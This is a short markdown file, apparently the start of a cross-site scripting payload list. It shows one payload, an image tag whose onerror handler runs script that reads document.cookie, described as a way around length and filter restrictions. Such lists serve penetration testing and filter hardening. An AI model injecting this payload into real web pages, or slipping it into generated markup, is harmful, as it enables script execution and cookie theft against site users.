`Payloads.md`:
```markdown
# XSS Payloads
## Payload 1: Image Event Handler (Bypassing Length/Filter Restrictions)
```html
<img src="x" onerror="alert(document.cookie)">
